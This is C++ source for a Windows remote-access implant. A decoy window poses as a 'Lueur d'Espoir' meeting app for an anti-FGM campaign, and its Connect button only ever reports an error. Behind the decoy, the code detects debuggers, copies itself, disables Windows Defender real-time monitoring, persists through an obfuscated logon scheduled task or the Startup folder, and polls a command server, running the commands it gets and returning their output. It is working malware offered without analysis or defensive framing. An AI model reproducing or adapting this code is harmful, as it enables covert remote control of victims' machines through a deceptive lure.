#include "main.hpp"

#define IDM_FILE_EXIT 1
#define IDM_HELP_ABOUT 2

HBRUSH hBrushStatic = CreateSolidBrush(RGB(255, 255, 255));
HBRUSH hBrushRed = CreateSolidBrush(RGB(255, 0, 0));

DWORD WINAPI yarnGUI(LPVOID lpParam);
DWORD WINAPI yarnMain(LPVOID lpParam);
DWORD WINAPI yarnAntiVM(LPVOID lpParam);
DWORD WINAPI yarnPersist(LPVOID lpParam);

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

int main()
{
	calculatePrimeNo(100000);
	yarn(4, yarnMain, yarnGUI, yarnAntiVM, yarnPersist);
	return 0;
}

DWORD WINAPI yarnAntiVM(LPVOID lpParam)
{
	if (isDebuggerPresent())
	{
		calculatePrimeNo(10000);
		exit(EXIT_FAILURE);
	}
	return 0;
}

DWORD WINAPI yarnPersist(LPVOID lpParam)
{
	int success = copyMyself();
	if (success == EXIT_SUCCESS)
	{
		char szDestDir[MAX_PATH];
		char exePath[MAX_PATH];
		HRESULT result;
		result = SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, szDestDir);
		if (result != S_OK)
		{
			return EXIT_FAILURE;
		}
		strcat(szDestDir, "\\ApplicationData");
		strcat(exePath, szDestDir);
		strcat(exePath, "\\1805.exe");
		if (IsUserAdmin())
		{
			//////////////////////////////////////////////////////////////////////////////////////////////
			system("powershell.exe -Command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");

			//////////////////////////////////////////////////////////////////////////////////////////////
			char *username = getenv("USERNAME");
			char taskCommand[500];
			strcat(taskCommand, sXOR("powershell.exe -Command \"Register-ScheduledTask -TaskName \"SystemMonitor\" -TaskPath \"Windows\" -User "));
			strcat(taskCommand, username);
			strcat(taskCommand, sXOR(" -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute \""));
			strcat(taskCommand, exePath);
			strcat(taskCommand, sXOR("\") -RunLevel Highest -Force"));
			int result = system(taskCommand);
			if (result != 0)
			{
			}
		}
		else
		{
			char startupFolderPath[MAX_PATH];
			HRESULT result;
			result = SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, SHGFP_TYPE_CURRENT, startupFolderPath);
			if (result != S_OK)
			{
				return EXIT_FAILURE;
			}
			if (!CopyFileTo(sXOR("1805.exe"), startupFolderPath))
				return EXIT_FAILURE;
		}
	}
	return 0;
}

DWORD WINAPI yarnMain(LPVOID lpParam)
{
	if (init())
	{
		return 1;
	}
	int g = 0;
	do
	{
		g++;
		Dict payload[] = {
			{"payload", "ping"},
			{NULL, NULL}};
		char *req = request(payload, sXOR("/flight/scour/"));
		if (req != NULL)
		{
			if (strcmp(req, "null") != 0)
			{
				Command command = deserializeCommand(req);
				if (command.command)
				{
					char *output = execute((char *)command.command);
					char *results = output == NULL ? strdup("No output!") : output;
					Dict pld[] = {
						{"id", command.id},
						{"results", results},
						{NULL, NULL}};
					char *res = request(pld, sXOR("/flight/rake/"));
				}
			}
		}
		Sleep(getSleep());
	} while (1);
	return 0;
}

DWORD WINAPI yarnGUI(LPVOID lpParam)
{
	WNDCLASS wc = {0};
	wc.lpfnWndProc = WndProc;
	wc.hInstance = GetModuleHandle(NULL);
	wc.lpszClassName = "MyClass";
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1); // Set background color

	RegisterClass(&wc);

	HWND hwnd = CreateWindowEx(0, "MyClass", "Lueur d'Espoir", WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, CW_USEDEFAULT, 500, 500, NULL, NULL, GetModuleHandle(NULL), NULL);

	if (hwnd == NULL)
	{
		MessageBox(NULL, "Window Creation Failed!", "Error!", MB_ICONEXCLAMATION | MB_OK);
		return 0;
	}

	// Create menu
	HMENU hMenu = CreateMenu();
	HMENU hSubMenu = CreateMenu();

	AppendMenu(hSubMenu, MF_STRING, IDM_FILE_EXIT, "Exit");
	AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, "File");

	hSubMenu = CreateMenu();
	AppendMenu(hSubMenu, MF_STRING, IDM_HELP_ABOUT, "About");
	AppendMenu(hMenu, MF_POPUP, (UINT_PTR)hSubMenu, "Help");

	SetMenu(hwnd, hMenu);

	// Add a static text (title) below the menu
	HWND hTitle = CreateWindow("STATIC", "Welcome to Lueur d'Espoir", WS_VISIBLE | WS_CHILD | SS_CENTER, 0, 0, 500, 60, hwnd, (HMENU)3, NULL, NULL);

	HFONT hFont = CreateFont(30, 0, 0, 0, FW_BOLD, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
	SendMessage(hTitle, WM_SETFONT, (WPARAM)hFont, TRUE);

	// Add a static text (message) in the window
	HWND hText = CreateWindow("STATIC", "Joining Hands to End Female Genital Mutilation in Africa.", WS_VISIBLE | WS_CHILD | SS_CENTER, 50, 150, 400, 50, hwnd, NULL, NULL, NULL);
	HFONT hFont2 = CreateFont(24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE, "Arial");
	SendMessage(hText, WM_SETFONT, (WPARAM)hFont2, TRUE);

	CreateWindow("EDIT", "Enter meeting id...", WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL, 150, 300, 200, 30, hwnd, (HMENU)3, NULL, NULL);

	// Add a button in the window
	CreateWindow("BUTTON", "Connect", WS_VISIBLE | WS_CHILD, 200, 350, 100, 30, hwnd, (HMENU)4, NULL, NULL);

	ShowWindow(hwnd, SW_SHOW);
	UpdateWindow(hwnd);

	MSG msg;
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	// Cleanup
	DeleteObject(hBrushStatic);
	DeleteObject(hBrushRed);
	return (int)msg.wParam;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch (msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	case WM_COMMAND:
		switch (LOWORD(wParam))
		{
		case IDM_FILE_EXIT:
			DestroyWindow(hwnd);
			break;
		case IDM_HELP_ABOUT:
			break;
		case 4:
			MessageBox(NULL, "Error! Can't connect to meeting.", "Error", MB_ICONEXCLAMATION | MB_OK);
			break;
		}
		break;
	case WM_CTLCOLORSTATIC: // Handle static control color
	{
		HDC hdcStatic = (HDC)wParam;
		HWND hwndStatic = (HWND)lParam;

		if (hwndStatic == GetDlgItem(hwnd, 3)) // Check if static control ID is 3 (title)
		{
			SetBkMode(hdcStatic, TRANSPARENT);
			SetTextColor(hdcStatic, RGB(255, 255, 255));
			return (LRESULT)hBrushRed;
		}
		else
		{
			SetBkMode(hdcStatic, TRANSPARENT);
			return (LRESULT)hBrushStatic;
		}
	}
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}